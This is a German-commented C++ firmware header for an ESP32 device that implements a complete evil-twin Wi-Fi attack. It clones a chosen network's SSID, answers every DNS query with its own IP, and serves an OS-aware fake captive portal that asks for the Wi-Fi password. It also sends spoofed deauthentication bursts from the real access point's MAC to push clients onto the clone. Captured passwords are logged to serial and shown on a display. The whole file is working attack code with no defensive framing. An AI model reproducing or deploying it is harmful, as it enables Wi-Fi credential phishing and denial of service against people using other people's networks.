#pragma once
// =====================================================================
//  EvilTwin.hpp - Evil-Twin-Accesspoint fuer ESP-Jam
//  ------------------------------------------------------------------
//  Der Benutzer waehlt ein gescanntes Netzwerk aus (SSID + Kanal +
//  BSSID aus scannedNetworks[]). Die ESP32 startet dann einen
//  AccessPoint mit IDENTISCHER SSID auf IDENTISCHEM Kanal:
//    1. DNS-Hijack      : alle DNS-Anfragen -> 192.168.4.1
//    2. Captive-Portal  : OS-Erkennung (Win/Apple/Android/Linux),
//                         Login-Seite faengt Passworteingaben ab
//    3. Deauth-Bursts   : kooperation mit dem echten AP - Clients
//                         werden periodisch vom Original getrennt,
//                         solange kein Client beim Zwilling haengt
//                         (Auto-Pause, manuell per [OK] abschaltbar)
//  Portiert aus dem EvilTwinESP32U-Package (dns_server, portal,
//  http_server, deauth_engine) in das ESP-Jam-Menusystem.
// =====================================================================
#include <WiFi.h>
#include <WiFiUdp.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <esp_wifi.h>
#include <esp_mac.h>

// ------------------------- Konfiguration -----------------------------
static const char          ET_AP_PASSWORD[] = "";      // offenes AP - Login passiert im Portal
static const uint8_t       ET_AP_MAX_CLIENTS = 8;
static const int           ET_HTTP_PORT  = 80;
static const int           ET_DNS_PORT   = 53;
static const unsigned long ET_DEAUTH_BURST_INTERVAL = 15000; // ms zwischen Bursts
static const int           ET_DEAUTH_BURST_FRAMES = 24;
static const int           ET_DEAUTH_FRAME_GAP = 12;    // ms zwischen Frames
static const unsigned long ET_CAPTURE_SHOW_MS = 10000;   // Passwort-Anzeigezeit
static const int           ET_MAX_LOGINS = 8;           // RAM-Ringpuffer

static IPAddress ET_AP_IP(192, 168, 4, 1);
static IPAddress ET_AP_NETMASK(255, 255, 255, 0);
static const char ET_AP_URL[] = "http://192.168.4.1/index.html";

// ------------------------- Zustand -----------------------------------
bool evilTwinActive   = false;
bool etPendingSelect  = false;      // Scan laeuft -> danach Zielliste zeigen
int  etTargetIdx      = -1;
String etSSID         = "";
uint8_t etTargetBSSID[6] = {0};
int  etChannel        = 1;
bool etDeauthEnabled  = true;
unsigned long etLastBurst = 0;
int  etViewPage      = 0;            // 0=Status, 1..n=Login-Seiten

unsigned long etDNSQueries     = 0;
unsigned long etHTTPRequests   = 0;
unsigned long etDeauthFrames   = 0;
unsigned long etLoginCount     = 0;
unsigned long etLastLoginAt    = 0;
String etLastUser = "";
String etLastPass = "";

struct EtLogin {
  String user;
  String pass;
  unsigned long at;
  uint32_t ip;
};
EtLogin etLogins[ET_MAX_LOGINS];
int etLoginHead = 0;   // naechster Schreibindex

// Bereits "abgeschlossene" Client-IPs (Login abgegeben)
#define ET_MAX_SATISFIED 16
uint32_t etSatisfiedIPs[ET_MAX_SATISFIED];
int etSatisfiedCount = 0;
int etSatisfiedHead = 0;   // Ring-Zeiger fuers Ueberschreiben

// ------------------------- Hilfsfunktionen ---------------------------
static int etHexVal(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

static String etUrlDecode(const String &s) {
  String out;
  out.reserve(s.length());
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+') { out += ' '; continue; }
    if (c == '%' && i + 2 < s.length()) {
      int hi = etHexVal(s[i + 1]);
      int lo = etHexVal(s[i + 2]);
      if (hi >= 0 && lo >= 0) {
        out += (char)((hi << 4) | lo);
        i += 2;
        continue;
      }
    }
    out += c;
  }
  return out;
}

// Extrahiert ?user=...&password=... bzw. POST-Body "name=wert&..."
static String etGetParam(const String &data, const char *name) {
  String key = String(name) + "=";
  int start = 0;
  while (start < (int)data.length()) {
    int amp = data.indexOf('&', start);
    if (amp < 0) amp = data.length();
    String chunk = data.substring(start, amp);
    if (chunk.startsWith(key)) return chunk.substring(key.length());
    start = amp + 1;
  }
  return "";
}

static bool etIpSatisfied(uint32_t ip) {
  for (int i = 0; i < etSatisfiedCount; i++)
    if (etSatisfiedIPs[i] == ip) return true;
  return false;
}

static void etMarkSatisfied(uint32_t ip) {
  if (etIpSatisfied(ip)) return;
  if (etSatisfiedCount < ET_MAX_SATISFIED) {
    etSatisfiedIPs[etSatisfiedCount++] = ip;
  } else {                       // Ring: aeltesten Eintrag ueberschreiben
    etSatisfiedIPs[etSatisfiedHead] = ip;
    etSatisfiedHead = (etSatisfiedHead + 1) % ET_MAX_SATISFIED;
  }
}

static void etResetSatisfied() {
  etSatisfiedCount = 0;
  etSatisfiedHead = 0;
}

// =====================================================================
//  DNS-Hijack (aus dns_server.cpp): beantwortet ALLE A-Anfragen mit
//  der IP des AccessPoints -> Geraete landen immer beim Portal
// =====================================================================
WiFiUDP etDNS;
static uint8_t etDNSBuf[512];

static void etDNSStart() {
  etDNS.stop();
  etDNS.begin(ET_DNS_PORT);
}

static void etDNSTick() {
  int packetSize = etDNS.parsePacket();
  if (packetSize <= 0 || packetSize > 511) return;
  IPAddress remote = etDNS.remoteIP();
  int len = etDNS.read(etDNSBuf, 511);
  etDNS.flush();
  if (len < 12) return;

  // QNAME laeuft von Offset 12 bis zum Null-Label (0x00). Bisher wurde
  // etDNSBuf[11] (Low-Byte von QDCOUNT) als Laenge missbraucht -> das
  // erzeugte Antwortpaket war ungueltig und wurde von Clients verworfen.
  int pos = 12;
  while (pos < len && etDNSBuf[pos] != 0) {
    uint8_t labelLen = etDNSBuf[pos];
    if (labelLen > 63 || pos + 1 + (int)labelLen > len) return;  // Kompression/Muell
    pos += 1 + labelLen;
  }
  if (pos >= len) return;                      // kein Null-Terminator -> verwerfen
  int qnameLen = pos + 1 - 12;                 // inkl. Null-Byte
  if (pos + 5 > len) return;                   // QTYPE + QCLASS muessen passen

  uint16_t qtype = ((uint16_t)etDNSBuf[pos + 1] << 8) | etDNSBuf[pos + 2];
  uint16_t ancount = (qtype == 1) ? 1 : 0;     // nur A-Anfragen beantworten

  etDNS.beginPacket(remote, ET_DNS_PORT);
  etDNS.write(etDNSBuf, 2);              // Transaction ID
  etDNS.write(0x81); etDNS.write(0x80);  // Flags: Response, Recursion
  etDNS.write(0x00); etDNS.write(0x01);  // Questions
  etDNS.write(0x00); etDNS.write((uint8_t)ancount);  // Answers
  etDNS.write(0x00); etDNS.write(0x00);  // Authority
  etDNS.write(0x00); etDNS.write(0x00);  // Additional
  etDNS.write(etDNSBuf + 12, qnameLen + 4);  // Question-Sektion (QNAME+QTYPE+QCLASS)
  if (ancount == 1) {
    etDNS.write(0xC0); etDNS.write(0x0C);  // Zeiger auf den Frage-Namen
    etDNS.write(0x00); etDNS.write(0x01);  // Type A
    etDNS.write(0x00); etDNS.write(0x01);  // Class IN
    etDNS.write(0x00); etDNS.write(0x00);
    etDNS.write(0x00); etDNS.write(0x3C);  // TTL 60s
    etDNS.write(0x00); etDNS.write(0x04);  // RDLENGTH
    etDNS.write(ET_AP_IP[0]);
    etDNS.write(ET_AP_IP[1]);
    etDNS.write(ET_AP_IP[2]);
    etDNS.write(ET_AP_IP[3]);
  }
  etDNS.endPacket();

  etDNSQueries++;
}

// =====================================================================
//  OS-Erkennung (aus portal.cpp)
// =====================================================================
enum class EtClientOS { WINDOWS, ANDROID, APPLE, LINUX, GENERIC };

struct EtRequest {
  String method;
  String path;
  String host;
  String ua;
  String body;
  uint32_t ip = 0;
};

struct EtResponse {
  int status = 200;
  const char *reason = "OK";
  String contentType = "text/html";
  String redirect = "";
  String body = "";
};

static EtClientOS etDetectOs(const EtRequest &req) {
  String pL = req.path;  pL.toLowerCase();
  String hL = req.host;  hL.toLowerCase();
  String uaL = req.ua;   uaL.toLowerCase();

  // Captive-Probe-URLs (hochverlaesslich)
  if (pL.indexOf("msftconnecttest") >= 0 || hL.indexOf("msftconnecttest") >= 0 ||
      pL.indexOf("msftncsi") >= 0 || hL.indexOf("msftncsi") >= 0 ||
      hL.indexOf("dns.msftncsi") >= 0) return EtClientOS::WINDOWS;
  if (pL.indexOf("generate_204") >= 0 || pL.indexOf("gen_204") >= 0 ||
      hL.indexOf("connectivitycheck") >= 0 || hL.indexOf("gstatic.com") >= 0 ||
      hL.indexOf("clients3.google.com") >= 0 || hL.indexOf("www.google.com") >= 0)
    return EtClientOS::ANDROID;
  if (pL.indexOf("hotspot-detect") >= 0 || hL.indexOf("captive.apple.com") >= 0 ||
      hL.indexOf("apple.com") >= 0 || uaL.indexOf("captivenetworksupport") >= 0)
    return EtClientOS::APPLE;
  if (hL.indexOf("ubuntu") >= 0 || hL.indexOf("fedora") >= 0 ||
      hL.indexOf("debian") >= 0 || hL.indexOf("opensuse") >= 0 ||
      pL.indexOf("success.txt") >= 0 || uaL.indexOf("networkmanager") >= 0)
    return EtClientOS::LINUX;

  // Fallback: User-Agent
  if (uaL.indexOf("windows") >= 0) return EtClientOS::WINDOWS;
  if (uaL.indexOf("android") >= 0) return EtClientOS::ANDROID;
  if (uaL.indexOf("iphone") >= 0 || uaL.indexOf("ipad") >= 0 ||
      uaL.indexOf("macintosh") >= 0 || uaL.indexOf("mac os") >= 0) return EtClientOS::APPLE;
  if (uaL.indexOf("linux") >= 0) return EtClientOS::LINUX;
  return EtClientOS::GENERIC;
}

// =====================================================================
//  HTML-Seiten
// =====================================================================
static const char ET_PORTAL_HTML[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Anmeldung am Netzwerk</title>
<style>
body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
       background: #f3f3f3; margin: 0; padding: 24px;
       display: flex; align-items: center; justify-content: center; min-height: 90vh; }
.card { background: #fff; border-radius: 10px; padding: 32px 28px;
        box-shadow: 0 2px 14px rgba(0,0,0,.12); max-width: 360px; width: 100%;
        box-sizing: border-box; }
h1 { font-size: 1.25rem; margin: 0 0 6px; color: #222; word-break: break-word; }
p.sub { color: #666; margin: 0 0 20px; font-size: .92rem; }
.badge { display: inline-block; padding: 4px 10px; border-radius: 4px;
         color: #fff; font-size: .78rem; margin-bottom: 14px; }
label { display: block; font-size: .82rem; color: #555; margin: 14px 0 4px; }
input { width: 100%; box-sizing: border-box; padding: 10px 12px;
        border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; }
button { margin-top: 18px; width: 100%; padding: 11px; border: 0;
         border-radius: 6px; background: %%ACCENT%%; color: #fff;
         font-size: 1rem; cursor: pointer; }
.err { color: #c0392b; font-size: .82rem; margin-top: 12px; }
</style>
</head>
<body>
<div class="card">
<span class="badge" style="background:%%ACCENT%%">%%VENDOR%%</span>
<h1>%%SSID%%</h1>
<p class="sub">Bitte mit dem WLAN-Passwort anmelden, um fortzufahren.</p>
<form method="POST" action="/login">
<label>WLAN-Passwort</label>
<input name="password" type="password" required autocomplete="off" autofocus>
<button type="submit">Anmelden</button>
</form>
<p class="err">Falsches Passwort? Bitte erneut versuchen.</p>
</div>
</body>
</html>)rawliteral";

static const char ET_SUCCESS_HTML[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Angemeldet</title>
<style>
body { font-family: system-ui, sans-serif; background: #f3f3f3; margin: 0;
       padding: 24px; display: flex; align-items: center;
       justify-content: center; min-height: 90vh; }
.card { background: #fff; border-radius: 10px; padding: 32px;
        box-shadow: 0 2px 14px rgba(0,0,0,.12); max-width: 360px; text-align: center; }
h1 { color: #1e8e3e; font-size: 1.2rem; margin: 0 0 8px; }
p { color: #555; margin: 0; }
</style>
</head>
<body>
<div class="card">
<h1>Verbindung erfolgreich</h1>
<p>Deine Anmeldung wurde geprueft.<br>Du kannst dieses Fenster schliessen.</p>
</div>
</body>
</html>)rawliteral";

static String etRedirectPage(const String &url) {
  String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0; url=";
  html += url;
  html += "\"></head><body>Weiterleitung ...</body></html>";
  return html;
}

static String etIndexPage(EtClientOS os) {
  String accent = "#0078d7";
  String vendor = "Netzwerk";
  switch (os) {
    case EtClientOS::WINDOWS: accent = "#0078d7"; vendor = "Windows Netzwerk"; break;
    case EtClientOS::ANDROID: accent = "#3ddc84"; vendor = "WLAN-Anmeldung";   break;
    case EtClientOS::APPLE:   accent = "#0071e3"; vendor = "WLAN-Anmeldung";   break;
    case EtClientOS::LINUX:   accent = "#e95420"; vendor = "Netzwerk";         break;
    default:                  accent = "#0078d7"; vendor = "Netzwerk";         break;
  }
  String page = FPSTR(ET_PORTAL_HTML);
  page.replace("%%ACCENT%%", accent);
  page.replace("%%VENDOR%%", vendor);
  page.replace("%%SSID%%", etSSID);
  return page;
}

static String etSuccessPage() {
  return FPSTR(ET_SUCCESS_HTML);
}

// =====================================================================
//  Request-Verarbeitung (aus portal.cpp handleRequest)
// =====================================================================
static bool etIsWindowsProbe(const EtRequest &req) {
  String pL = req.path; pL.toLowerCase();
  return (pL.indexOf("ncsi.txt") >= 0 || pL.indexOf("connecttest") >= 0 ||
          pL.indexOf("redirect") >= 0);
}

static void etRecordLogin(const String &user, const String &pass, uint32_t ip) {
  etLogins[etLoginHead].user = user;
  etLogins[etLoginHead].pass = pass;
  etLogins[etLoginHead].at = millis();
  etLogins[etLoginHead].ip = ip;
  etLoginHead = (etLoginHead + 1) % ET_MAX_LOGINS;
  etLoginCount++;
  etLastUser = user;
  etLastPass = pass;
  etLastLoginAt = millis();
  etViewPage = 0;                    // direkt zur Passwort-Anzeige springen
  Serial.printf("[EVILTWIN] Login #%lu von %u.%u.%u.%u | user='%s' | pass='%s'\n",
                (unsigned long)etLoginCount,
                (unsigned)(ip & 0xFF), (unsigned)((ip >> 8) & 0xFF),
                (unsigned)((ip >> 16) & 0xFF), (unsigned)((ip >> 24) & 0xFF),
                user.c_str(), pass.c_str());
  etMarkSatisfied(ip);
}

// Seitenzahl der Login-Ansicht: 1 Statusseite + 2 Logins pro Seite
static int etLoginPages() {
  int valid = (etLoginCount < (unsigned long)ET_MAX_LOGINS) ? (int)etLoginCount : ET_MAX_LOGINS;
  return 1 + (valid + 1) / 2;
}

static EtResponse etHandleRequest(EtRequest &req) {
  EtResponse r;

  // --- Login-Erfassung ---------------------------------------------
  if (req.path.indexOf("/login") == 0) {
    String data;
    if (req.method == "POST") data = req.body;
    else {
      int q = req.path.indexOf('?');
      if (q >= 0) data = req.path.substring(q + 1);
    }
    if (data.length() > 0) {
      String user = etUrlDecode(etGetParam(data, "user"));
      String pass = etUrlDecode(etGetParam(data, "password"));
      if (pass.length() > 0) {
        etRecordLogin(user, pass, req.ip);
        r.status = 200;
        r.contentType = "text/html";
        r.body = etSuccessPage();
        return r;
      }
    }
    // Leerer Login -> Portal erneut zeigen
  }

  // ---- Routing: erst Pfade, dann OS-Erkennung ----------------------
  // Vorher wurde JEDER Nicht-Probe-Pfad (auch /index.html selbst) per
  // 302 auf ET_AP_URL umgeleitet -> Endlosschleife, Portal blieb weiss.
  String pL = req.path; pL.toLowerCase();

  if (pL.indexOf("favicon") >= 0) {                 // reine Browser-Probe
    r.status = 404; r.reason = "Not Found";
    r.contentType = "text/plain"; r.body = "";
    return r;
  }

  bool satisfiedNow = etIpSatisfied(req.ip);

  // Windows-CNA ruft /connecttest.txt und danach /redirect auf. /redirect
  // muss das Portal liefern, sonst zeigt Windows "kein Internet".
  if (pL.indexOf("redirect") >= 0) {
    r.status = 200; r.reason = "OK"; r.contentType = "text/html";
    r.body = satisfiedNow ? etSuccessPage() : etIndexPage(etDetectOs(req));
    return r;
  }

  // Direkte Portal-Routen (/, /index.html, /portal, leeres /login)
  if (pL == "/" || pL.indexOf("/index.html") == 0 ||
      pL.indexOf("/portal") == 0 || pL.indexOf("/login") == 0) {
    r.status = 200; r.reason = "OK"; r.contentType = "text/html";
    r.body = satisfiedNow ? etSuccessPage() : etIndexPage(etDetectOs(req));
    return r;
  }

  EtClientOS os = etDetectOs(req);
  bool satisfied = etIpSatisfied(req.ip);

  switch (os) {
    case EtClientOS::WINDOWS: {
      if (satisfied) {
        if (etIsWindowsProbe(req)) {
          r.status = 200;
          r.contentType = "text/plain";
          r.body = "Microsoft Connect Test";
        } else {
          r.status = 200;
          r.contentType = "text/html";
          r.body = etIndexPage(os);   // Windows-Browser oeffnet Portal
        }
      } else {
        if (etIsWindowsProbe(req)) {
          r.status = 200;             // "OFFLINE" haelt NCSI wach
          r.contentType = "text/plain";
          r.body = "OFFLINE";
        } else {
          r.status = 302;
          r.reason = "Found";
          r.redirect = ET_AP_URL;
          r.body = etRedirectPage(ET_AP_URL);
        }
      }
      break;
    }
    case EtClientOS::APPLE: {
      // iOS/macOS CNA: 302 -> Captive-Portal-Fenster oeffnet automatisch
      if (satisfied) {
        r.status = 200;
        r.contentType = "text/html";
        r.body = "Success";
      } else {
        r.status = 302;
        r.reason = "Found";
        r.redirect = ET_AP_URL;
        r.body = etRedirectPage(ET_AP_URL);
      }
      break;
    }
    case EtClientOS::ANDROID:
    case EtClientOS::LINUX:
    default: {
      if (satisfied) {
        r.status = 204;
        r.reason = "No Content";
        r.body = "";
      } else {
        r.status = 302;
        r.reason = "Found";
        r.redirect = ET_AP_URL;
        r.body = etRedirectPage(ET_AP_URL);
      }
      break;
    }
  }
  return r;
}

// =====================================================================
//  Raw-HTTP-Server (aus http_server.cpp)
// =====================================================================
WiFiServer etHTTP(ET_HTTP_PORT);

static void etHTTPStart() {
  etHTTP.stop();
  etHTTP.begin();
  etHTTP.setNoDelay(true);
}

static void etSendResponse(WiFiClient &client, const EtResponse &r) {
  String head = "HTTP/1.1 " + String(r.status) + " " + r.reason + "\r\n";
  head += "Content-Type: " + r.contentType + "\r\n";
  head += "Content-Length: " + String(r.body.length()) + "\r\n";
  head += "Connection: close\r\n";
  head += "Cache-Control: no-store\r\n";
  if (r.redirect.length() > 0) head += "Location: " + r.redirect + "\r\n";
  head += "\r\n";
  client.print(head);
  if (r.body.length() > 0) client.print(r.body);
  client.flush();
  client.stop();
}

static bool etReadRequest(WiFiClient &client, EtRequest &req) {
  // bewusst ohne client.setTimeout(): 2.0.x interpretiert das als SEKUNDEN,
  // die millis()-Schutzschleifen unten steuern das Timing auf beiden Cores
  unsigned long start = millis();

  // auf die Request-Zeile warten (max. 1200 ms)
  while (client.connected() && !client.available()) {
    if (millis() - start > 1200) return false;
    delay(1);
  }
  String requestLine = client.readStringUntil('\n');
  requestLine.trim();
  int sp1 = requestLine.indexOf(' ');
  int sp2 = requestLine.indexOf(' ', sp1 + 1);
  if (sp1 <= 0 || sp2 < 0) return false;
  req.method = requestLine.substring(0, sp1);
  req.path = requestLine.substring(sp1 + 1, sp2);
  if (req.path.length() == 0) return false;

  int contentLength = 0;
  while (client.connected()) {
    if (millis() - start > 2000) break;
    if (!client.available()) { delay(1); continue; }
    String h = client.readStringUntil('\n');
    h.trim();
    if (h.length() == 0) break;            // Ende der Header
    String hL = h; hL.toLowerCase();
    if (hL.startsWith("host:")) {
      req.host = h.substring(5);
      req.host.trim();
    } else if (hL.startsWith("user-agent:")) {
      req.ua = h.substring(11);
      req.ua.trim();
    } else if (hL.startsWith("content-length:")) {
      contentLength = h.substring(15).toInt();
    }
  }

  if (req.method == "POST" && contentLength > 0) {
    int n = contentLength > 1024 ? 1024 : contentLength;
    unsigned long t2 = millis();
    while ((int)client.available() < n && client.connected()) {
      if (millis() - t2 > 1500) break;
      delay(1);
    }
    if (client.available() > 0) req.body = client.readString();
    if ((int)req.body.length() > n) req.body = req.body.substring(0, n);
  }
  return true;
}

static void etHTTPTick() {
  WiFiClient client = etHTTP.accept();
  if (!client) return;

  EtRequest req;
  req.ip = client.remoteIP();
  etHTTPRequests++;

  if (etReadRequest(client, req)) {
    EtResponse resp = etHandleRequest(req);
    etSendResponse(client, resp);
  } else {
    client.stop();
  }
}

// =====================================================================
//  Deauth-Bursts (aus deauth_engine.cpp)
//  Frame: Deauth von der MAC des ECHTEN APs an Broadcast -> Clients
//  trennen sich vom Original und suchen neu -> landen beim Zwilling
// =====================================================================
static void etSendBurst() {
  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;        // Frame-Control: Deauth
  pkt[2] = 0x3A; pkt[3] = 0x01;        // Duration
  pkt[4] = pkt[5] = pkt[6] = pkt[7] = pkt[8] = pkt[9] = 0xFF;   // Ziel: Broadcast
  memcpy(pkt + 10, etTargetBSSID, 6);  // Absender = echtes AP
  memcpy(pkt + 16, etTargetBSSID, 6);  // BSSID  = echtes AP
  pkt[22] = 0x00; pkt[23] = 0x00;      // Sequence
  pkt[24] = 0x03; pkt[25] = 0x00;      // Reason 3: STA leaving

  esp_wifi_set_channel(etChannel, WIFI_SECOND_CHAN_NONE);
  static uint16_t seq = 0;
  for (int i = 0; i < ET_DEAUTH_BURST_FRAMES; i++) {
    pkt[22] = seq & 0xFF;
    pkt[23] = (seq >> 8) & 0xFF;
    seq++;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, pkt, 26, true);
    if (err != ESP_OK) {
      Serial.printf("[EVILTWIN] TX-Fehler: %s\n", esp_err_to_name(err));
      break;
    }
    etDeauthFrames++;
    delay(ET_DEAUTH_FRAME_GAP);
  }
}

static void etRequestBurstNow() {
  etLastBurst = 0;
}

// =====================================================================
//  Start / Stop / Tick
// =====================================================================
static void etFlashMessage(const char *l1, const char *l2) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(10, 24);
  display.print(l1);
  display.setCursor(10, 36);
  display.print(l2);
  display.display();
  delay(1200);
}

void startEvilTwin(int idx) {
  if (idx < 0 || idx >= networkCount) return;

  String rawSsid = scannedNetworks[idx].ssid;
  if (rawSsid.length() == 0 || rawSsid == "(hidden)") {
    etFlashMessage("Verstecktes Netz:", "SSID nicht emulierbar");
    return;
  }
  int ch = scannedNetworks[idx].channel;
  if (ch < 1 || ch > 13) {
    etFlashMessage("Kanal nicht nutzbar", "(5 GHz nicht unterstuetzt)");
    return;
  }

  etTargetIdx = idx;
  etSSID = rawSsid;
  etChannel = ch;
  memcpy(etTargetBSSID, scannedNetworks[idx].bssid, 6);

  Serial.printf("[EVILTWIN] Start: '%s' ch%d BSSID %02X:%02X:%02X:%02X:%02X:%02X\n",
                etSSID.c_str(), etChannel,
                etTargetBSSID[0], etTargetBSSID[1], etTargetBSSID[2],
                etTargetBSSID[3], etTargetBSSID[4], etTargetBSSID[5]);

  // Laufende WLAN-Aktionen beenden (Kanal-/Radio-Konflikt vermeiden)
  stopDeauth();
  stopSniffer();
  delay(50);

  // BLE freigeben (RAM) - WLAN neu aufsetzen
  ensureBLEOffForWiFi();
  WiFi.disconnect(true);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(150);

  WiFi.mode(WIFI_AP_STA);
  delay(100);
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  WiFi.softAPConfig(ET_AP_IP, ET_AP_IP, ET_AP_NETMASK);
  WiFi.softAP(etSSID.c_str(), ET_AP_PASSWORD, etChannel, false, ET_AP_MAX_CLIENTS);
  delay(120);

  // Promiscuous + Kanal (Voraussetzung fuer 80211-TX)
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(etChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_max_tx_power(78);

  etResetSatisfied();
  etDNSQueries = 0;
  etHTTPRequests = 0;
  etDeauthFrames = 0;
  etLoginCount = 0;
  etLoginHead = 0;
  etLastUser = "";
  etLastPass = "";
  etLastLoginAt = 0;
  etLastBurst = 0;
  etDeauthEnabled = true;
  etViewPage = 0;

  etDNSStart();
  etHTTPStart();

  evilTwinActive = true;

  // Sofort-Burst: Clients vom Original trennen
  etSendBurst();
}

void stopEvilTwin() {
  if (!evilTwinActive) return;
  evilTwinActive = false;
  etHTTP.stop();
  etDNS.stop();
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  Serial.printf("[EVILTWIN] Gestoppt. Logins=%lu TX=%lu DNS=%lu HTTP=%lu\n",
                (unsigned long)etLoginCount, etDeauthFrames, etDNSQueries, etHTTPRequests);
}

void evilTwinTick() {
  if (!evilTwinActive) return;

  etDNSTick();
  etHTTPTick();

  uint8_t stations = WiFi.softAPgetStationNum();

  // Auto-Lock: nicht gegen das Original senden, solange ein Client
  // am Zwilling haengt (sonst wirft man den eigenen Gast raus)
  if (etDeauthEnabled && stations == 0 &&
      millis() - etLastBurst >= ET_DEAUTH_BURST_INTERVAL) {
    etLastBurst = millis();
    etSendBurst();
  }
}

// =====================================================================
//  Anzeige: Zielliste + Laufzeit-UI
// =====================================================================
static int etDupCountFor(int idx) {
  if (scannedNetworks[idx].ssid.length() == 0) return 1;
  int c = 0;
  for (int i = 0; i < networkCount; i++)
    if (scannedNetworks[i].ssid == scannedNetworks[idx].ssid) c++;
  return c;
}

void drawEvilTwinSelect() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print("EVIL TWIN - Ziel:");
  display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

  if (networkCount == 0) {
    display.setCursor(10, 28);
    display.print("Keine Netzwerke!");
    display.setCursor(10, 40);
    display.print("< Back");
    display.display();
    return;
  }

  clampScroll(networkCount + 1);
  int total = networkCount + 1;
  for (int i = 0; i < ITEMS_PER_PAGE; i++) {
    int item = scrollOffset + i;
    if (item >= total) break;
    int yPos = 12 + i * 11;
    if (item == selectedIndex) display.drawRoundRect(0, yPos - 1, 120, 12, 2, SSD1306_WHITE);
    if (item == networkCount) {
      display.setCursor(4, yPos);
      display.print("< Back");
    } else {
      display.setCursor(4, yPos);
      String name = scannedNetworks[item].ssid;
      if (name.length() == 0) name = "(hidden)";
      int dup = etDupCountFor(item);
      if (dup > 1) name = "(" + String(dup) + ") " + name;
      if (name.length() > 8) name = name.substring(0, 8);
      display.print(name);
      display.setCursor(72, yPos);
      display.print("ch" + String(scannedNetworks[item].channel));
      display.setCursor(100, yPos);
      display.print(String(scannedNetworks[item].rssi));
    }
  }
  display.display();
}

void drawEvilTwinUI() {
  display.clearDisplay();
  display.setTextSize(1);

  int etValid = (etLoginCount < (unsigned long)ET_MAX_LOGINS) ? (int)etLoginCount : ET_MAX_LOGINS;
  int etPages = 1 + (etValid + 1) / 2;
  if (etViewPage >= etPages) etViewPage = 0;

  if (etViewPage > 0) {
    // ---- Login-Liste (2 Eintraege pro Seite, neueste zuerst) ----
    display.setCursor(0, 0);
    display.print("LOGINS " + String(etViewPage) + "/" + String(etPages - 1));
    display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
    for (int k = 0; k < 2; k++) {
      int j = (etViewPage - 1) * 2 + k;
      if (j >= etValid) break;
      int idx = (etLoginHead - 1 - j + ET_MAX_LOGINS) % ET_MAX_LOGINS;
      int yPos = 12 + k * 20;
      String u = etLogins[idx].user; if (u.length() == 0) u = "-";
      if (u.length() > 9) u = u.substring(0, 9);
      String p = etLogins[idx].pass;
      if (p.length() > 13) p = p.substring(0, 13);
      display.setCursor(0, yPos);
      display.print("#" + String((unsigned long)(etLoginCount - j)) + " " + u);
      display.setCursor(0, yPos + 10);
      display.print("PW:" + p);
    }
    display.drawLine(0, 52, 128, 52, SSD1306_WHITE);
    display.setCursor(0, 54);
    display.print("OK:Deauth <:Stopp");
    display.display();
    return;
  }

  display.setCursor(0, 0);
  display.print("EVIL TWIN ch" + String(etChannel) + (etDeauthEnabled ? " D" : " ."));
  display.drawLine(0, 9, 128, 9, SSD1306_WHITE);

  display.setCursor(0, 12);
  String n = "AP: " + etSSID;
  if (n.length() > 21) n = n.substring(0, 21);
  display.print(n);

  display.setCursor(0, 22);
  char b[18];
  snprintf(b, sizeof(b), "OP: %02X:%02X:%02X:%02X:%02X:%02X",
           etTargetBSSID[0], etTargetBSSID[1], etTargetBSSID[2],
           etTargetBSSID[3], etTargetBSSID[4], etTargetBSSID[5]);
  display.print(b);

  display.setCursor(0, 32);
  String l1 = "Cl:" + String(WiFi.softAPgetStationNum()) +
              " DNS:" + String(etDNSQueries) +
              " HTTP:" + String(etHTTPRequests);
  if (l1.length() > 21) l1 = l1.substring(0, 21);
  display.print(l1);

  display.setCursor(0, 42);
  String l2 = "TX:" + String(etDeauthFrames) +
              " Logins:" + String(etLoginCount);
  if (l2.length() > 21) l2 = l2.substring(0, 21);
  display.print(l2);

  display.drawLine(0, 52, 128, 52, SSD1306_WHITE);
  display.setCursor(0, 54);
  if (etLastPass.length() > 0 && millis() - etLastLoginAt < ET_CAPTURE_SHOW_MS) {
    // scrollende Anzeige des zuletzt abgefangenen Passworts
    String line = "PW: " + etLastPass;
    int len = line.length();
    if (len < 1) len = 1;
    int off = ((millis() - etLastLoginAt) / 250) % len;
    String shown = line.substring(off) + "  " + line.substring(0, off);
    if (shown.length() > 21) shown = shown.substring(0, 21);
    display.print(shown);
  } else {
    display.print("[OK]Deauth [<]Stopp");
  }
  display.display();
}
